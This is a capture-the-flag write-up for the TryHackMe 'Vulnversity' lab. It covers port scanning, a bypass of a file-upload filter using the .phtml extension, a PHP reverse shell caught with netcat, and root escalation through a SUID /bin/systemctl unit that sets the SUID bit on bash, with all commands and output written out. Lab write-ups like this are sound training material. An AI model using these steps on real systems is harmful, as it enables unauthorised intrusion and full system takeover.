---
layout: default
title: Vulnversity
parent: Try Hack Me - Windows
nav_order: 1
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/THM/vulnversity]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 10.10.121.123

Nmap scan report for 10.10.121.123

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)

139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-01-03T21:07:48-05:00
|_clock-skew: mean: 1h40m10s, deviation: 2h53m12s, median: 9s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2024-01-04T02:07:48
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.76 seconds



```

# Enumeration

---

## SMB | 445

```bash
nmap --script smb-vuln* -p445 10.10.10.161
```

## HTTP | 3128

## HTTP | 3333

Gobuster uncovers _/internal_ directory

![upload](../../../assets/images/ctfs/try_hack_me/vulnversity/upload.png)

Attempted to upload _test.php_ but received "Extension not allowed".

Testing with Burp.

Able to upload .phtml file

# Exploitation

Attempting to upload php-reverse-shell.php from Pentest Monkey.

Edit IP and Port.

Start netcat listener and upload rev.phtml reverse shell.

Gobuster uncovered _/internal/uploads_ and that is where the uploaded PHP reverse shell file is located.

```bash
┌──(vagrant㉿kali)-[~/Documents/THM/vulnversity]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.18.48.44] from (UNKNOWN) [10.10.121.123] 38500
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:32:45 up 30 min,  0 users,  load average: 0.26, 0.24, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Privesc

Located user _bill_

## Check for SUID Permissions

```bash
find / -perm -u=s -type f 2>/dev/null

www-data@vulnuniversity:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

## Exploit /bin/systemctl

Checking GTFObins we have a path to privesc by exploiting _/bin/systemctl_

![systemctl](../../../assets/images/ctfs/try_hack_me/vulnversity/systemctl.png)

We can exploit in the following manner by giving effective root privileges to _/bin/bash_

```bash
www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
www-data@vulnuniversity:/tmp$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.o6GKXSAfpc.service to /tmp/tmp.o6GKXSAfpc.service.
www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.o6GKXSAfpc.service to /tmp/tmp.o6GKXSAfpc.service.
www-data@vulnuniversity:/tmp$ bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.3#

```
